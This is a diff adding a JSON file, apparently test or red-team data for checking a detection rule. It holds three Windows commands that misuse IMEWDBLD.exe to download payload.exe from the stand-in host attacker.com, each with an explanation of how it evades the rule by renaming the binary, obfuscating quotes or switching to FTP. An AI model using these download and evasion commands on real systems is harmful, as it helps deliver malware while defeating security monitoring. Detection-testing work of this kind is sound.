@@ -1,0 +1,14 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\IMEWDBLD.exe %TEMP%\\not_a_downloader.exe && %TEMP%\\not_a_downloader.exe http://attacker.com/payload.exe",
+    "explanation": "The rule relies on the 'selection_img' filter which looks for the specific process name 'IMEWDBLD.exe' or its 'OriginalFileName' metadata. By copying the binary to a new location with a different name, the 'Image|endswith' check is bypassed. While some EDRs still track 'OriginalFileName', simple command-line scanners often miss renamed binaries."
+  },
+  {
+    "output": "imewdbld.exe \"h\"tt\"p://attacker.com/payload.exe\"",
+    "explanation": "The rule uses a simple 'contains' check for 'http://' or 'https://'. Using standard Windows command-line obfuscation, such as inserting double quotes within the protocol string, can bypass string-matching logic in some SIEM/EDR implementations while still being interpreted correctly by the underlying process."
+  },
+  {
+    "output": "imewdbld.exe ftp://attacker.com/payload.exe",
+    "explanation": "The detection logic specifically targets the HTTP and HTTPS protocols. If the environment or the binary supports alternative URI schemes like FTP or SMB for fetching remote resources, the rule will not trigger because 'ftp://' is not included in the 'selection_cli' list."
+  }
+]
